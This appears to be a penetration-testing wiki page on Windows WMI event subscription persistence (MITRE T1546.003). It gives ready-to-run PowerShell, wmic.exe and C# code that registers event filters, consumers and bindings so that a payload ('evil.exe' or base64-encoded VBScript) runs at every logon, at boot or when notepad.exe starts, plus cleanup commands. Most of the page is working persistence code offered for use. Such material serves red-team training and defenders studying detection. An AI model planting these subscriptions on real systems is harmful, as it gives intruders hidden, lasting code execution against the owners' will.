---
description: >-
  MITRE ATT&CK™  Event Triggered Execution: Windows Management Instrumentation
  Event Subscription - Technique T1546.003
---

# WMI Event Subscription

## Theory

Using WMI on a remote endpoint, we can perform persistence based on subscription to WMI events. Note that this technique can be used to perform lateral movements. [See this page](../../pivoting/remote-wmi.md#lateral-movement-via-wmi-event-subscription) for more information

Typically, WMI event subscription requires creation of the following three classes which are used to store the payload or the arbitrary command, to specify the event that will trigger the payload and to relate the two classes (\_\_EventConsumer &\_\_EventFilter) so execution and trigger to bind together.

* **\_\_EventFilter** // Trigger (new process, failed logon etc.)
* **EventConsumer** // Perform Action (execute payload etc.)
* **\_\_FilterToConsumerBinding** // Binds Filter and Consumer Classes

Implementation of this technique doesn’t require any toolkit since Windows has a utility that can interact with WMI (wmic) and PowerShell can be leveraged as well.

## Practice

{% tabs %}
{% tab title="Windows - Powershell" %}
Execution of the following commands using powershell will create in the name space of _“**root\subscription**“_ three events. You can set the arbitrary payload to execute within 5 seconds on **every new logon session creation** or within 60 seconds **every time Windows starts.**

```powershell
#Create filter
#Query to execute payload within 60 seconds every time Windows starts:
#SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325
$FilterArgs = @{name='v4resk-WMI'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

#Create consumer
$ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate="$($Env:SystemRoot)\System32\evil.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

#Create cosnmerBinding (bind filter & consumer)
$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

We can cleanup using following commands

```powershell
#Get Filter,Consumer,FilterConsumerBindin
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'v4resk-WMI'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'v4resk-WMI'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"

#Remove
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
```
{% endtab %}

{% tab title="Windows - wmic.exe" %}
Execution of the following commands using wmic.exe will create in the name space of _“**root\subscription**“_ three events. You can set the arbitrary payload to execute within 5 seconds on **every new logon session creation** or within 60 seconds **every time Windows starts.**

```powershell
#Create filter to execute payload within 5 seconds on every new logon session creation:
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="JustAnEventFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'"
#Or
#Create filter to execute payload within 60 seconds every time Windows starts:
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="JustAnEventFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="JustAconsumer", ExecutablePath="C:\Windows\TEMP\evil.exe",CommandLineTemplate="C:\Windows\TEMP\evil.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"JustAnEventFilter\"", Consumer="CommandLineEventConsumer.Name=\"JustAconsumer\""
```
{% endtab %}

{% tab title="C#" %}
We can implement the same technique with following `C#` code

```csharp
// WMI Event Subscription Peristence Demo
// Author: @domchell

using System;
using System.Text;
using System.Management;

namespace WMIPersistence
{
    class Program
    {
        static void Main(string[] args)
        {
            PersistWMI();
        }

        static void PersistWMI()
        {
            ManagementObject myEventFilter = null;
            ManagementObject myEventConsumer = null;
            ManagementObject myBinder = null;

            string vbscript64 = "<INSIDE base64 encoded VBS here>";
            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));
            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");

                ManagementClass wmiEventFilter = new ManagementClass(scope, new
                ManagementPath("__EventFilter"), null);
                String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +            
        "WHERE TargetInstance ISA \"Win32_Process\" " +           
        "AND TargetInstance.Name = \"notepad.exe\"";

                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
                myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = "demoEventFilter";
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                myEventFilter.Put();
                Console.WriteLine("[*] Event filter created.");

                myEventConsumer =
                new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"),
                null).CreateInstance();
                myEventConsumer["Name"] = "BadActiveScriptEventConsumer";
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = vbscript;
                myEventConsumer.Put();

                Console.WriteLine("[*] Event consumer created.");

                myBinder =
                new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"),
                null).CreateInstance();
                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
                myBinder.Put();

                Console.WriteLine("[*] Subscription created");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            } // END CATCH
            Console.ReadKey();
        } // END FUNC
    } // END CLASS
} // END NAMESPACE

```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/" %}
